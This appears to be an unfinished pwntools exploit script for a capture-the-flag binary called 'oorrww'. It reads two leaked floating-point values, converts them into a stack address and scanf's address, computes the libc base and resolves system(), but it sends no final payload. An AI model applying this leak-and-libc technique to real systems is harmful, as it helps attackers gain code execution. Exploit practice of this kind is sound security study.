from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)
# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg

'''.format(**locals())
# Set up pwntools for the correct architecture
exe = './oorrww'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
libc = ELF('./libc.so.6')
context.log_level = 'debug'
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
io = start()

# Function to extract floating-point values from the output
def extract_floats(output):
    lines = output.split()
    # print(f"lines[4]: {lines[6]}")
    float_val1 = float(lines[5])
    float_val2 = float(lines[6][:-1])  # Remove the trailing exclamation mark
    return float_val1, float_val2
    
# Receive the output from the process

output = io.recvline().decode().strip()
print(f"Received output: {output}")

# Extract the floating-point values from the output
float_val1, float_val2 = extract_floats(output)

# Convert the floating-point values to addresses
input_addr = struct.unpack('<Q', struct.pack('<d', float_val1))[0]
scanf_addr = struct.unpack('<Q', struct.pack('<d', float_val2))[0]

# Print the addresses
print(f"Input addr: {hex(input_addr)}")
print(f"Scanf addr: {hex(scanf_addr)}")

libcBase = scanf_addr - libc.sym['__isoc99_scanf']
print(f"LibC Base addr: {hex(libcBase)}")

system = libcBase+libc.sym['system']
print("system: "+str(hex(system)))

io.interactive()

